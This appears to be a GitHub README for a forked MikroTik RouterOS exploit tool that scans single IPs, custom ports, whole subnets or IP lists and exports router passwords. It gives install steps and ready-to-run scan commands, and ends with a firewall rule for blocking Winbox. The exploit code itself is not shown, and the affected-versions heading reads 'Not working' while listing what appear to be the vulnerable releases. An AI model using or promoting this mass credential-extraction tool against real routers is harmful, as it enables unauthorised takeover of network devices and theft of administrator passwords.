# Mikrotik Exploit
Scan and Export RouterOS Password

allow you to scan subnet of IPv4 in loop with different port.


## Installation

##### install python3
Ubuntu/Debian:
```
$ apt-get install python3
```
##### install python3 Python package manager
Ubuntu/Debian:
```
$ apt-get install python3-pip
```
Mac
```
$ ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
```
```
export PATH=/usr/local/bin:/usr/local/sbin:$PATH
```
```
$ brew install python3
```
##### Install dependencies
```
$ pip3 install ipcalc
$ pip3 install requests
```

##### Clone the repository
```
$ git clone https://github.com/miladdiaz/MikrotikExploit
$ cd MikrotikExploit
```
## How to use
scan single ip:
*In script root dir*
```
$ python3 loop.py 192.168.1.10
```
scan with different port
```
$ python3 loop.py 192.168.1.10 -p 8282
```
scan range of ip
```
$ python3 loop.py 192.168.1.0/24
````
scan list of IP from file

```
$ python3 loop.py -f list.txt
```
## Not wokring on some versions
all versions from 6.29 (release date: 2015/28/05) to 6.42 (release date 2018/04/20)

## Secure your router
**Update RouterOS and limit Winbox login**
```
ip firewall filter add chain=input in-interface=wan protocol=tcp dst-port=8291 action=drop
```

## Copyright
this repository forked from [BigNerd95/Chimay-Red](https://github.com/BigNerd95/Chimay-Red) and [BasuCert/WinboxPoC](https://github.com/BasuCert/WinboxPoC) with some changes for subnet scan, use different port and IP list file.
